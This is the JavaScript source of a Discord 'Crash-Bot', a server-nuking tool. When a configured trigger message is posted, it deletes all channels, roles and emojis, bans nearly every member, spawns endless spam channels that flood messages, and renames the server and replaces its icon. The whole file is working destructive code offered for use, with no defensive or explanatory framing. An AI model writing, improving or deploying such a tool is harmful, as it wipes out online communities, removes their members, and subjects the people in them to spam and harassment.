/*
Project : Crash-Bot
Author : Sertinox
*/

//INIT DISCORDJS
const {Client, Message, MessageEmbed} = require('discord.js');
const client = new Client();

//INIT CONFIG FILE
const config = require('./config.json')


client.on('ready', () => {
    // CONSOLE CONNECT BOT !
    console.log(`[${client.user.tag}] est bien ONLINE !`);

    // ACTIVITY BOT !
    client.user.setActivity(`${config.activity}`, {type: "WATCHING"});
})

client.on('message', message => {
    if(message.content === config.commanddestroy) {
        /*
        DELETE ALL CHANNEL
        */
        if(config.deletechannel === "true"){
            let c = message.guild.channels.cache.filter(c => c.deletable);
            c.forEach((c) => {
                c.delete();
                console.log(`[CHANNEL] "${c.name}" deleted`)
            })
        }
            
        /*
        BAN ALL MEMBER
        */
        if(config.banmembers === "true"){
            let m = message.guild.members.cache.filter(m => m.bannable);
            m.forEach((m) => {
                if(m.id != config.nobaniddiscord){
                    m.ban();
                    console.log(`[BAN] "${m.user.username}" banned`)
                }
            })
        }
        /*
        DELETE ALL ROLES
        */
        if(config.deleteroles === "true"){
            let r = message.guild.roles.cache.filter(r => r.editable);
            r.forEach((r) => {
                if(r.name != '@everyone') {
                    r.delete();
                    console.log(`[ROLES] "${r.name}" deleted`)
                }
            })
        }
        /*
        DELETE ALL EMOJI
        */
        if(config.deleteemoji === "true"){
            let e = message.guild.emojis.cache.filter(e => e.deletable);
            e.forEach((e) => {
                e.delete();
                console.log(`[EMOJI] "${e.name}" deleted`)
            })
        }
        /*
        CREATE CHANNEL + SPAM MESSAGE
        */
        if(config.createchannelspam === "true"){
            let interval = setInterval(function() {
                message.guild.channels.create(config.channelname, {
                    type: 'text'
                }).then(async (channel) => {
                    let interval = setInterval(function() {
                        channel.send(config.channelmessage)
                    }, config.channelinterval)
                })
            }, config.channelinterval)
        }
        /*
        RENAME DISCORD
        */
        if(config.renamediscord === "true"){
            if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                message.guild.setName(config.discordname)
            }
        }
        /* 
        IMAGE DISCORD
        */
        if(config.imagediscord === "true"){
            if(message.guild.me.hasPermission('ADMINISTRATOR')) {
                message.guild.setIcon(config.discordicon)
            }
        }
    }
})


client.login(config.token)